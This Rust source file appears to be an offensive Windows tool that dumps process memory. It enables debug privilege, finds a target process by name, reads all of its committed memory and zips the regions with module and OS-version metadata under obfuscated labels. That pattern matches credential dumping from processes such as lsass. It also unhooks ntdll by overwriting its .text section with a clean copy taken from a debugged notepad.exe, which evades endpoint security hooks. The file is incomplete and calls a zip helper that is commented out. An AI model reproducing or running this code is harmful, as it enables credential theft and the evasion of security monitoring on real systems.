use std::{
    ffi::{c_void, OsStr},
    fs::File,
    io::Write,
    iter::once,
    mem::{size_of, zeroed},
    os::windows::ffi::OsStrExt,
    ptr::{self, null_mut},
};
use clap::Parser;
use zip::{write::FileOptions, ZipWriter};
use winapi::{
    shared::{
        basetsd::SIZE_T,
        minwindef::{DWORD, FALSE, MAX_PATH, ULONG},
        ntdef::{HANDLE, LUID, NTSTATUS, PVOID, PWSTR, USHORT},
    },
    um::{
        processthreadsapi::{
            CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
        },
        winbase::DEBUG_PROCESS,
        winnt::{
            MEMORY_BASIC_INFORMATION, OSVERSIONINFOW, RTL_OSVERSIONINFOW,
            PAGE_NOACCESS, MEM_COMMIT, MAXIMUM_ALLOWED,
            TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
        },
    },
};


type BOOLEAN = u8;
const PROCESS_BASIC_INFORMATION_CLASS: ULONG = 0;
const PROCESS_BASIC_INFORMATION: ULONG = 0;
const STATUS_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
const STATUS_INVALID_PARAMETER: i32 = 0x8000000Du32 as i32;
const NT_SUCCESS: fn(NTSTATUS) -> bool = |status| status >= 0;
const MAX_MODULES: usize = 1024;
const STATUS_SUCCESS: NTSTATUS = 0;
const PROCESS_DEBUG_OBJECT_HANDLE: ULONG = 0x1e;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;


extern "system" {
    fn RtlGetVersion(lpVersionInformation: *mut RTL_OSVERSIONINFOW) -> NTSTATUS;
    fn NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: *mut HANDLE) -> NTSTATUS;
    fn NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: *mut TOKEN_PRIVILEGES, BufferLength: DWORD, PreviousState: *mut TOKEN_PRIVILEGES, ReturnLength: *mut DWORD) -> NTSTATUS;
    fn NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: usize, NumberOfBytesRead: *mut usize) -> NTSTATUS;
    fn NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: ULONG, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: *mut ULONG) -> NTSTATUS;
    fn NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: u32, HandleAttributes: u32, Flags: u32, NewProcessHandle: *mut HANDLE) -> NTSTATUS;
    fn NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MemoryInformationClass, MemoryInformation: PVOID, MemoryInformationLength: usize, ReturnLength: *mut usize) -> NTSTATUS;
    fn NtRemoveProcessDebug(ProcessHandle: HANDLE, DebugObjectHandle: HANDLE) -> NTSTATUS;
    fn NtTerminateProcess(ProcessHandle: HANDLE, ExitStatus: NTSTATUS) -> NTSTATUS;
    fn NtClose(Handle: HANDLE) -> NTSTATUS;
    fn NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: *mut *mut c_void, RegionSize: *mut SIZE_T, NewProtect: u32, OldProtect: *mut ULONG) -> NTSTATUS;
    fn NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: *mut c_void, Buffer: *const c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: *mut usize) -> NTSTATUS;
}


#[repr(u32)] #[derive(Debug, Clone, Copy)] pub enum MemoryInformationClass { MemoryBasicInformation = 0 }
#[repr(C)] struct TOKEN_PRIVILEGES { privilege_count: DWORD, privileges: [LUID_AND_ATTRIBUTES; 1] }
#[repr(C)] struct LUID_AND_ATTRIBUTES { luid: LUID, attributes: DWORD }
#[allow(dead_code)] #[repr(C)] struct UNICODE_STRING { length: USHORT, maximum_length: USHORT, buffer: PWSTR }
#[repr(C)] struct TOKEN_PRIVILEGES_STRUCT { privilege_count: DWORD, luid: LUID, attributes: DWORD }
#[repr(C)] #[derive(Debug, Clone)] pub struct ModuleInformation { base_dll_name: [u8; MAX_PATH], full_dll_path: [u8; MAX_PATH], dll_base: PVOID, size: i32 }
impl Default for ModuleInformation { fn default() -> Self { Self { base_dll_name: [0; MAX_PATH], full_dll_path: [0; MAX_PATH], dll_base: ptr::null_mut(), size: 0 } } }
#[derive(Debug)] pub struct TextSectionInfo { pub base_of_code: DWORD, pub size_of_code: DWORD }
#[allow(dead_code)] #[derive(Debug, Clone)] struct MemFile { filename: String, content: Vec<u8>, size: usize }


fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}


fn enable_debug_privileges() -> Result<(), String> {
    unsafe {
        let current_process: HANDLE = -1isize as HANDLE;
        let mut token_handle: HANDLE = null_mut();

        let status = NtOpenProcessToken(
            current_process,
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
            &mut token_handle,
        );

        if !NT_SUCCESS(status) {
            return Err(format!(
                "[-] Error calling NtOpenProcessToken. NTSTATUS: 0x{:08X}",
                status
            ));
        }

        let mut token_privileges = TOKEN_PRIVILEGES_STRUCT {
            privilege_count: 1,
            luid: LUID { LowPart: 20, HighPart: 0 },
            attributes: 0x00000002,
        };

        let status = NtAdjustPrivilegesToken(
            token_handle,
            FALSE as BOOLEAN,
            &mut token_privileges as *mut _ as *mut TOKEN_PRIVILEGES,
            std::mem::size_of::<TOKEN_PRIVILEGES>() as DWORD,
            null_mut(),
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            NtClose(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
            return Err(format!(
                "[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{:08X}",
                status
            ));
        }

        NtClose(token_handle as *mut winapi::ctypes::c_void); // CloseHandle(token_handle);
        println!("[+] Debug privileges enabled successfully.");
        Ok(())
    }
}


unsafe fn read_remote_int_ptr(process: HANDLE, address: PVOID) -> Option<PVOID> {
    let mut buffer = [0u8; 8];
    let mut bytes_read = 0usize;
    let status = NtReadVirtualMemory(
        process,
        address,
        buffer.as_mut_ptr() as PVOID,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 && status != STATUS_ACCESS_VIOLATION && status != STATUS_INVALID_PARAMETER {
        eprintln!(
            "[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x{:X} reading address {:p}",
            status, address
        );
        return None;
    }

    let value = *(buffer.as_ptr() as *const usize) as PVOID;
    Some(value)
}


unsafe fn read_remote_wstr(process: HANDLE, address: PVOID) -> String {
    let mut buffer = [0u8; 256];
    let mut bytes_read = 0usize;
    let status = NtReadVirtualMemory(
        process,
        address,
        buffer.as_mut_ptr() as PVOID,
        buffer.len(),
        &mut bytes_read,
    );

    if status != 0 && status != STATUS_ACCESS_VIOLATION && status != STATUS_INVALID_PARAMETER {
        eprintln!(
            "[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x{:X} reading address {:p}",
            status, address
        );
    }

    let mut output = Vec::new();
    for i in (0..buffer.len() - 1).step_by(2) {
        let wchar = u16::from_le_bytes([buffer[i], buffer[i + 1]]);
        if wchar == 0 {
            break;
        }
        output.push(wchar);
    }

    String::from_utf16_lossy(&output)
}


unsafe fn get_proc_name_from_handle(process: HANDLE) -> Option<String> {
    let peb_offset = 0x8;
    let processparameters_offset = 0x20;
    let commandline_offset = 0x68;

    let mut pbi_buffer = [0u8; 48];
    let mut return_length: ULONG = 0;

    let status = NtQueryInformationProcess(
        process,
        PROCESS_BASIC_INFORMATION_CLASS,
        pbi_buffer.as_mut_ptr() as PVOID,
        pbi_buffer.len() as ULONG,
        &mut return_length,
    );

    if !nt_success(status) {
        eprintln!(
            "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}",
            status
        );
        return None;
    }

    let peb_address_ptr = *(pbi_buffer.as_ptr().add(peb_offset) as *const *const c_void);
    let process_parameters_ptr = (peb_address_ptr as usize + processparameters_offset) as PVOID;
    let process_parameters = read_remote_int_ptr(process, process_parameters_ptr)?;

    let commandline_ptr = (process_parameters as usize + commandline_offset) as PVOID;
    let commandline = read_remote_int_ptr(process, commandline_ptr)?;
    Some(read_remote_wstr(process, commandline))
}


unsafe fn get_process_by_name(target_name: &str) -> Option<HANDLE> {
    let mut handle: HANDLE = null_mut();
    while nt_success(NtGetNextProcess(handle, MAXIMUM_ALLOWED, 0, 0, &mut handle)) {
        if let Some(mut name) = get_proc_name_from_handle(handle) {
            name = name.to_ascii_lowercase();
            if name == target_name {
                return Some(handle);
            }
        }
    }
    None
}


fn add_module(list: &mut Vec<ModuleInformation>, new_module: ModuleInformation) {
    list.push(new_module);
}


unsafe fn custom_get_module_handle(h_process: HANDLE) -> Result<Vec<ModuleInformation>, String> {
    let mut module_list = Vec::with_capacity(MAX_MODULES);
    const PEB_OFFSET: usize = 0x8;
    const LDR_OFFSET: usize = 0x18;
    const IN_INITIALIZATION_ORDER_MODULE_LIST_OFFSET: usize = 0x30;
    const FLINK_DLLBASE_OFFSET: usize = 0x10;
    const FLINK_BUFFER_FULLDLLNAME_OFFSET: usize = 0x30;
    const FLINK_BUFFER_OFFSET: usize = 0x40;

    let mut pbi_byte_array = [0u8; 48];
    let pbi_addr = pbi_byte_array.as_mut_ptr() as PVOID;

    let mut return_length = 0;
    let ntstatus = NtQueryInformationProcess(
        h_process,
        PROCESS_BASIC_INFORMATION,
        pbi_addr,
        48,
        &mut return_length,
    );

    if ntstatus != 0 {
        return Err(format!("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}", ntstatus));
    }

    let peb_pointer = (pbi_addr as usize + PEB_OFFSET) as PVOID;
    let peb_address = *(peb_pointer as *const PVOID);

    println!("[+] PEB Address: \t0x{:X}", peb_address as usize);

    let ldr_pointer = (peb_address as usize + LDR_OFFSET) as PVOID;
    let ldr_address = match read_remote_int_ptr(h_process, ldr_pointer) {
        Some(addr) => addr,
        None => return Err("Failed to read LDR address".to_string()),
    };

    let in_initialization_order_module_list = (ldr_address as usize + IN_INITIALIZATION_ORDER_MODULE_LIST_OFFSET) as PVOID;
    println!("[+] Ldr Pointer: \t0x{:X}", ldr_pointer as usize);
    println!("[+] Ldr Address: \t0x{:X}", ldr_address as usize);

    let mut dll_base: PVOID = 1337 as PVOID;
    let mut next_flink = match read_remote_int_ptr(h_process, in_initialization_order_module_list) {
        Some(flink) => flink,
        None => return Err("Failed to read module list".to_string()),
    };

    while !dll_base.is_null() {
        // Corrección clave: Ajustar el puntero SIN leer memoria
        let current_entry = next_flink as usize - 0x10;
        
        // Leer campos desde la entrada actual
        dll_base = match read_remote_int_ptr(
            h_process, 
            ((next_flink as usize) + FLINK_DLLBASE_OFFSET) as PVOID
        ) {
            Some(base) => base,
            None => break,
        };

        let buffer = match read_remote_int_ptr(
            h_process, 
            (next_flink as usize + FLINK_BUFFER_OFFSET) as PVOID
        ) {
            Some(buf) => buf,
            None => break,
        };

        let base_dll_name = read_remote_wstr(h_process, buffer);

        // Create new ModuleInformation
        let mut new_module = ModuleInformation::default();
        new_module.dll_base = dll_base;
        
        // Copy base DLL name
        let base_name_bytes = base_dll_name.as_bytes();
        let copy_len = base_name_bytes.len().min(MAX_PATH - 1);
        new_module.base_dll_name[..copy_len].copy_from_slice(&base_name_bytes[..copy_len]);
        
        // Full DLL Path
        let full_dll_name_addr = match read_remote_int_ptr(
            h_process, 
            (next_flink as usize + FLINK_BUFFER_FULLDLLNAME_OFFSET) as PVOID
        ) {
            Some(addr) => addr,
            None => break,
        };
        
        let full_dll_name = read_remote_wstr(h_process, full_dll_name_addr);
        
        // Copy full DLL path
        let full_path_bytes = full_dll_name.as_bytes();
        let copy_len = full_path_bytes.len().min(MAX_PATH - 1);
        new_module.full_dll_path[..copy_len].copy_from_slice(&full_path_bytes[..copy_len]);

        if !dll_base.is_null() {
            add_module(&mut module_list, new_module);
        }

        next_flink = match read_remote_int_ptr(
            h_process, 
            (current_entry + 0x10) as PVOID
        ) {
            Some(flink) => flink,
            None => break,
        };
        // println!("[+] Processing module {}", counter);
    }

    Ok(module_list)
}


pub fn find_module_by_name(
    module_list: &[ModuleInformation],
    aux_name: &[u8],
) -> ModuleInformation {
    module_list
        .iter()
        .find(|module| module.base_dll_name == aux_name)
        .cloned()
        .unwrap_or_default()
}


pub fn find_module_index_by_name(
    module_list: &[ModuleInformation],
    aux_name: &[u8],
) -> usize {
    module_list.iter().position(|module| module.base_dll_name == aux_name).unwrap_or_default()
}



fn lock() -> String {
    let mut osvi = OSVERSIONINFOW {
        dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as DWORD,
        dwMajorVersion: 0,
        dwMinorVersion: 0,
        dwBuildNumber: 0,
        dwPlatformId: 0,
        szCSDVersion: [0; 128],
    };

    unsafe {
        assert_eq!(RtlGetVersion(&mut osvi), 0, "RtlGetVersion failed");
        format!(
            "[{{\"field0\":\"{}\",\"field1\":\"{}\",\"field2\":\"{}\"}}]",
            osvi.dwMajorVersion, 
            osvi.dwMinorVersion, 
            osvi.dwBuildNumber
        )
    }
}


unsafe fn shock(h_process: HANDLE) -> String {    
    let mut module_list = unsafe { custom_get_module_handle(h_process) };
    let proc_max_address_l: u64 = 0x7FFFFFFEFFFF;
    let mut mem_address: PVOID = std::ptr::null_mut();
    let mut aux_size: i32 = 0;
    let mut aux_name: [u8; MAX_PATH] = [0; MAX_PATH];

    // Loop through the memory regions
    while (mem_address as u64) < proc_max_address_l {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let mut return_size: usize = 0;

        // If you defined the enum manually (Option 1 from previous answer):
        let ntstatus = unsafe {
            NtQueryVirtualMemory(
                h_process,
                mem_address,
                MemoryInformationClass::MemoryBasicInformation,  // Use enum variant instead of 0
                &mut mbi as *mut _ as PVOID,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                &mut return_size,
            )
        };
        
        if ntstatus != 0 {
            println!("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x{:x}", ntstatus);
        }

        // If readable and committed --> Get information
        if mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT {
            let modules = match module_list.as_mut() {
                Ok(modules) => modules,
                Err(e) => {
                    eprintln!("Failed to get module list: {}", e);
                    return Default::default();
                }
            };
            // let module_counter = modules.len();
            
            let module_found = find_module_by_name(modules, &aux_name);
            // println!("[+] 0x{:X}\tmbi.Protect: 0x{:x}\tmbi.State: 0x{:x}\tmbi.RegionSize: 0x{:x}", mem_address as usize, mbi.Protect, mbi.State, mbi.RegionSize);
            
            if mbi.RegionSize == 0x1000 {
                // println!("{}", aux_size);
                // println!("{}", String::from_utf8_lossy(&aux_name[..aux_name.iter().position(|&x| x == 0).unwrap_or(aux_name.len())]));
                // println!("[+] 0x{:X}\tmbi.Protect: 0x{:x}\tmbi.State: 0x{:x}\tmbi.RegionSize: 0x{:x}", mem_address as usize, mbi.Protect, mbi.State, mbi.RegionSize);

                if mbi.BaseAddress != module_found.dll_base as *mut _ {
                    let aux_index = find_module_index_by_name(modules, &aux_name);
                    let mut updated_module = module_found.clone();
                    updated_module.size = aux_size;
                    modules[aux_index] = updated_module;
                }

                // Buscar si la dirección actual corresponde a algún módulo
                for k in 0..(modules.len()) {
                    if let Some(module) = modules.get(k) {
                        if mbi.BaseAddress == module.dll_base as *mut _ {
                            // Actualizar aux_name y aux_size
                            aux_name.copy_from_slice(&module.base_dll_name);
                            aux_size = mbi.RegionSize as i32;
                            break;
                        }
                    }
                }
            } else {
                // Incrementar tamaño si no es una nueva región
                aux_size += mbi.RegionSize as i32;
            }

        }
        
        // Move to next memory region
        mem_address = unsafe {
            (mbi.BaseAddress as *mut u8).add(mbi.RegionSize) as PVOID
        };
    }

    // Generar el JSON
    let mut json_output = String::new();
    
    if let Ok(modules) = module_list {
        for module in modules {
            let name = module.base_dll_name.iter()
                .take_while(|&&c| c != 0)
                .map(|&c| c as char)
                .collect::<String>();
            let full_dll = module.full_dll_path.iter()
                .take_while(|&&c| c != 0)
                .map(|&c| c as char)
                .collect::<String>();

            json_output.push_str(&format!(
                r#"{{"field0":"{}","field1":"{}","field2":"{:X}","field3":{}}},"#,
                name.replace('\\', "\\\\").replace('"', "\\\""),
                full_dll.replace('\\', "\\\\").replace('"', "\\\""),
                module.dll_base as usize,
                module.size
            ));
        }
    }

    // Formatear el resultado final
    if !json_output.is_empty() {
        format!("[{}]", json_output.trim_end_matches(','))
    } else {
        "[]".to_string()
    }
}

/*
fn create_memory_zip(memfile_list: Vec<MemFile>, zip_path: &str) -> std::io::Result<()> {
    // Create the ZIP file
    let file = File::create(zip_path)?;
    let mut zip = ZipWriter::new(file);

    // Add each memory region to the ZIP
    for memfile in memfile_list {
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        
        zip.start_file(memfile.filename, options)?;
        zip.write_all(&memfile.content)?;
    }

    // Finalize the ZIP file
    zip.finish()?;
    Ok(())
}
*/

unsafe fn barrel(h_process: HANDLE) -> Result<(String, Vec<MemFile>), String> {
    let proc_max_address_l: u64 = 0x7FFFFFFEFFFF;
    let mut mem_address: PVOID = std::ptr::null_mut();    
    let mut json_output = String::new();
    let mut memfile_list: Vec<MemFile> = Vec::with_capacity(1000);
    let mut memfile_count = 0;

    // Loop through the memory regions
    while (mem_address as u64) < proc_max_address_l {
        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let mut return_size: usize = 0;

        let ntstatus = unsafe {
            NtQueryVirtualMemory(
                h_process,
                mem_address,
                MemoryInformationClass::MemoryBasicInformation,
                &mut mbi as *mut _ as PVOID,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                &mut return_size,
            )
        };
        
        if ntstatus != 0 {
            println!("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x{:x}", ntstatus);
        }

        // If readable and committed --> Get information
        if mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT {
            let region_size = mbi.RegionSize;
            let mut buffer: Vec<u8> = vec![0; region_size];
            let mut bytes_read: usize = 0;

            let status = unsafe {
                NtReadVirtualMemory(
                    h_process,
                    mbi.BaseAddress,
                    buffer.as_mut_ptr() as PVOID,
                    region_size,
                    &mut bytes_read,
                )
            };

            if status != 0 && status != 0x8000000Du32 as i32 {
                println!("NtReadVirtualMemory failed with status: 0x{:X}", status);
            }

            let json_item = format!(
                "{{\"field0\":\"{:p}\", \"field1\":\"{:p}\", \"field2\":{}}}, ",
                mem_address,
                mem_address,
                mbi.RegionSize
            );

            json_output.push_str(&json_item);

            let mem_file = MemFile {
                filename: format!("0x{:X}", mbi.BaseAddress as usize),
                content: buffer,
                size: region_size,
            };
            
            if memfile_count < memfile_list.capacity() {
                memfile_list.push(mem_file);
                memfile_count += 1;
            } else {
                return Err("Memfile list capacity exceeded".to_string());
            }
        }
        
        // Move to next memory region
        mem_address = unsafe {
            (mbi.BaseAddress as *mut u8).add(mbi.RegionSize) as PVOID
        };
    }

    println!("[+] Number of regions:\t{}", memfile_count);

    let json_output_final = format!("[{}]", json_output.trim_end_matches(", "));
    Ok((json_output_final, memfile_list))
}


unsafe fn get_module_address(dll_name: &str) -> Option<PVOID> {
    let process_basic_information_size = 48;
    let peb_offset = 0x8;
    let ldr_offset = 0x18;
    let in_initialization_order_module_list_offset = 0x30;
    let flink_dllbase_offset = 0x20;
    let flink_buffer_offset = 0x50;

    let mut pbi_buffer = [0u8; 48];
    let mut return_length: ULONG = 0;
    let h_process: HANDLE = -1isize as HANDLE;

    let status = NtQueryInformationProcess(
        h_process,
        PROCESS_BASIC_INFORMATION_CLASS,
        pbi_buffer.as_mut_ptr() as PVOID,
        process_basic_information_size as ULONG,
        &mut return_length,
    );

    if !NT_SUCCESS(status) {
        eprintln!("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{:08X}", status);
        return None;
    }

    let peb_address_ptr = pbi_buffer.as_ptr().add(peb_offset) as *const PVOID;
    let peb_address = read_remote_int_ptr(h_process, peb_address_ptr as PVOID)?;

    let ldr_pointer = (peb_address as usize + ldr_offset) as PVOID;
    let ldr_address = read_remote_int_ptr(h_process, ldr_pointer)?;

    let in_initialization_order_module_list = (ldr_address as usize + in_initialization_order_module_list_offset) as PVOID;
    let mut next_flink = read_remote_int_ptr(h_process, in_initialization_order_module_list)?;

    while !next_flink.is_null() {
        next_flink = (next_flink as usize - 0x10) as PVOID;

        let dll_base_ptr = (next_flink as usize + flink_dllbase_offset) as PVOID;
        let dll_base = read_remote_int_ptr(h_process, dll_base_ptr)?;

        let buffer_ptr = (next_flink as usize + flink_buffer_offset) as PVOID;
        let buffer = read_remote_int_ptr(h_process, buffer_ptr)?;
        let base_dll_name = read_remote_wstr(h_process, buffer);

        if base_dll_name.to_lowercase() == dll_name.to_lowercase() {
            return Some(dll_base);
        }

        let next_flink_ptr = (next_flink as usize + 0x10) as PVOID;
        next_flink = read_remote_int_ptr(h_process, next_flink_ptr)?;
    }

    None
}


pub unsafe fn get_text_section_info(ntdll_address: *mut u8) -> Option<TextSectionInfo> {
    let h_process = -1isize as HANDLE; // pseudo handle
    let mut bytes_read = 0;

    // Check MZ Signature (2 bytes)
    let mut signature_dos_header = [0u8; 2];
    if !NT_SUCCESS(NtReadVirtualMemory(
        h_process,
        ntdll_address as _,
        signature_dos_header.as_mut_ptr() as _,
        2,
        &mut bytes_read,
    )) || bytes_read != 2
    {
        eprintln!("[-] Error reading DOS header signature");
        return None;
    }

    if signature_dos_header[0] != b'M' || signature_dos_header[1] != b'Z' {
        eprintln!("[-] Incorrect DOS header signature");
        return None;
    }

    // Read e_lfanew (4 bytes) at offset 0x3C
    let mut e_lfanew = 0u32;
    if !NT_SUCCESS(NtReadVirtualMemory(
        h_process,
        ntdll_address.add(0x3C) as _,
        &mut e_lfanew as *mut _ as _,
        4,
        &mut bytes_read,
    )) || bytes_read != 4
    {
        eprintln!("[-] Error reading e_lfanew");
        return None;
    }

    // Check PE Signature (2 bytes)
    let mut signature_nt_header = [0u8; 2];
    if !NT_SUCCESS(NtReadVirtualMemory(
        h_process,
        ntdll_address.add(e_lfanew as usize) as _,
        signature_nt_header.as_mut_ptr() as _,
        2,
        &mut bytes_read,
    )) || bytes_read != 2
    {
        eprintln!("[-] Error reading NT header signature");
        return None;
    }

    if signature_nt_header[0] != b'P' || signature_nt_header[1] != b'E' {
        eprintln!("[-] Incorrect NT header signature");
        return None;
    }

    // Check Optional Headers Magic field value (2 bytes)
    let mut optional_header_magic = 0u16;
    if !NT_SUCCESS(NtReadVirtualMemory(
        h_process,
        ntdll_address.add(e_lfanew as usize + 24) as _,
        &mut optional_header_magic as *mut _ as _,
        2,
        &mut bytes_read,
    )) || bytes_read != 2
    {
        eprintln!("[-] Error reading Optional Header Magic");
        return None;
    }

    if optional_header_magic != 0x20B && optional_header_magic != 0x10B {
        eprintln!("[-] Incorrect Optional Header Magic field value");
        return None;
    }

    // Read SizeOfCode (4 bytes)
    let mut sizeofcode = 0u32;
    if !NT_SUCCESS(NtReadVirtualMemory(
        h_process,
        ntdll_address.add(e_lfanew as usize + 24 + 4) as _,
        &mut sizeofcode as *mut _ as _,
        4,
        &mut bytes_read,
    )) || bytes_read != 4
    {
        eprintln!("[-] Error reading SizeOfCode");
        return None;
    }

    // Read BaseOfCode (4 bytes)
    let mut baseofcode = 0u32;
    if !NT_SUCCESS(NtReadVirtualMemory(
        h_process,
        ntdll_address.add(e_lfanew as usize + 24 + 20) as _,
        &mut baseofcode as *mut _ as _,
        4,
        &mut bytes_read,
    )) || bytes_read != 4
    {
        eprintln!("[-] Error reading BaseOfCode");
        return None;
    }

    Some(TextSectionInfo {
        base_of_code: baseofcode,
        size_of_code: sizeofcode,
    })
}


pub unsafe fn get_ntdll_from_debug_proc(process_path: &str) -> Vec<u8> {
    let mut si: STARTUPINFOW = zeroed();
    si.cb = size_of::<STARTUPINFOW>() as DWORD;
    let mut pi: PROCESS_INFORMATION = zeroed();
    let mut debug_object_handle: HANDLE = null_mut();
    let mut return_length: ULONG = 0;

    // Convert path to wide string
    let wide_path: Vec<u16> = OsStr::new(process_path).encode_wide().chain(once(0)).collect();

    // Create suspended process with debug flag
    let success = CreateProcessW(
        wide_path.as_ptr(),
        null_mut(),
        null_mut(),
        null_mut(),
        0,
        DEBUG_PROCESS,
        null_mut(),
        null_mut(),
        &mut si,
        &mut pi,
    );

    if success == 0 {
        eprintln!("[-] CreateProcess failed");
        std::process::exit(1);
    }

    // Get local ntdll address and .text section info
    let local_ntdll_handle = match get_module_address("ntdll.dll") {
        Some(handle) => handle,
        None => {
            eprintln!("[-] Failed to locate ntdll.dll in current process");
            std::process::exit(1);
        }
    };

    let text_info = match get_text_section_info(local_ntdll_handle as *mut u8) {
        Some(info) => info,
        None => {
            eprintln!("[-] Failed to parse local ntdll");
            std::process::exit(1);
        }
    };

    let local_ntdll_text = (local_ntdll_handle as usize + text_info.base_of_code as usize) as PVOID;
    let text_size = text_info.size_of_code as usize;
    let mut ntdll_buffer = vec![0u8; text_size];
    let mut bytes_read: usize = 0;

    let status = NtReadVirtualMemory(
        pi.hProcess,
        local_ntdll_text,
        ntdll_buffer.as_mut_ptr() as PVOID,
        text_size,
        &mut bytes_read,
    );

    if !NT_SUCCESS(status) {
        eprintln!("[-] Read operation failed");
        std::process::exit(1);
    }

    // Query debug object handle
    let status = NtQueryInformationProcess(
        pi.hProcess,
        PROCESS_DEBUG_OBJECT_HANDLE,
        &mut debug_object_handle as *mut _ as PVOID,
        size_of::<HANDLE>() as ULONG,
        &mut return_length,
    );

    if !NT_SUCCESS(status) {
        eprintln!("[-] Failed to get debug object handle");
        std::process::exit(1);
    }

    // Cleanup
    let status = NtRemoveProcessDebug(pi.hProcess, debug_object_handle);
    if !NT_SUCCESS(status) {
        eprintln!("[-] Failed to remove process debug");
        std::process::exit(1);
    }

    let status = NtTerminateProcess(pi.hProcess, 0);
    if !NT_SUCCESS(status) {
        eprintln!("[-] Failed to terminate process");
        std::process::exit(1);
    }

    if !NT_SUCCESS(NtClose(pi.hProcess)) || !NT_SUCCESS(NtClose(pi.hThread)) {
        eprintln!("[-] Handle closure failed");
        std::process::exit(1);
    }

    ntdll_buffer
}


pub unsafe fn replace_ntdll_txt_section(
    unhooked_ntdll_txt: *const u8,
    local_ntdll_txt: *mut u8,
    local_ntdll_txt_size: u32,
) {
    let current_process = -1isize as HANDLE; // pseudo handle
    let mut region_size: SIZE_T = local_ntdll_txt_size as SIZE_T;
    let mut base_address: *mut c_void = local_ntdll_txt as *mut c_void;
    let mut old_protection: ULONG = 0;


    // Change protection to PAGE_EXECUTE_WRITECOPY
    let status = NtProtectVirtualMemory(
        current_process,
        &mut base_address,
        &mut region_size,
        PAGE_EXECUTE_WRITECOPY,
        &mut old_protection,
    );
    if status != STATUS_SUCCESS {
        eprintln!("[-] Failed to change memory protection");
        std::process::exit(1);
    }

    // Copy memory from unhooked to hooked
    let mut bytes_written: usize = 0;
    let status = NtWriteVirtualMemory(
        current_process,
        local_ntdll_txt as *mut c_void,
        unhooked_ntdll_txt as *const c_void,
        local_ntdll_txt_size as usize,
        &mut bytes_written,
    );
    if status != STATUS_SUCCESS || bytes_written != local_ntdll_txt_size as usize {
        eprintln!(
            "[-] Failed to write memory: status={:#X}, written={}",
            status, bytes_written
        );
        std::process::exit(1);
    }

    // Restore original protection
    let mut region_size: SIZE_T = local_ntdll_txt_size as SIZE_T;
    let mut base_address: *mut c_void = local_ntdll_txt as *mut c_void;
    let status = NtProtectVirtualMemory(
        current_process,
        &mut base_address,
        &mut region_size,
        old_protection,
        &mut old_protection,
    );
    if status != STATUS_SUCCESS {
        eprintln!("[-] Failed to restore memory protection");
        std::process::exit(1);
    }
}


pub unsafe fn remap_library(){    
    let unhooked_ntdll_txt = get_ntdll_from_debug_proc(r"C:\Windows\System32\notepad.exe");
    
    // Get local ntdll.dll base address
    let local_ntdll_handle = match get_module_address("ntdll.dll") {
        Some(handle) => handle,
        None => {
            eprintln!("[-] Failed to get ntdll.dll base address");
            std::process::exit(1);
        }
    };

    // Get text section information
    let text_section = match get_text_section_info(local_ntdll_handle as *mut u8) {
        Some(info) => info,
        None => {
            eprintln!("[-] Failed to get text section info");
            std::process::exit(1);
        }
    };

    let local_ntdll_txt_base = text_section.base_of_code;
    let local_ntdll_txt_size = text_section.size_of_code;
    let local_ntdll_txt = (local_ntdll_handle as usize + local_ntdll_txt_base as usize) as *mut u8;
    let unhooked_ntdll_txt_ptr = unhooked_ntdll_txt.as_ptr();
    
    println!("[+] Replacing 0x{:X} bytes from 0x{:X} to 0x{:X}", local_ntdll_txt_size, unhooked_ntdll_txt_ptr as usize, local_ntdll_txt as usize);
    replace_ntdll_txt_section(unhooked_ntdll_txt_ptr, local_ntdll_txt, local_ntdll_txt_size);
}


fn generate_zip(
    zip_filename: &str,
    lock_json: &str,
    shock_json: &str,
    barrel_json: &str,
    memfiles: &[MemFile],
) -> Result<(), Box<dyn std::error::Error>> {
    // Create the ZIP file
    let file = File::create(zip_filename)?;
    let mut zip = ZipWriter::new(file);

    // Add JSON files
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored);

    // Add main JSON files
    zip.start_file("lock.json", options)?;
    zip.write_all(lock_json.as_bytes())?;

    zip.start_file("shock.json", options)?;
    zip.write_all(shock_json.as_bytes())?;

    zip.start_file("barrel.json", options)?;
    zip.write_all(barrel_json.as_bytes())?;

    // Create memory ZIP
    let memory_zip = create_memory_zip(memfiles)?;
    zip.start_file("barrel.zip", options)?;
    zip.write_all(&memory_zip)?;

    // Finalize the ZIP
    zip.finish()?;

    println!("[+] File {} generated correctly", zip_filename);
    Ok(())
}


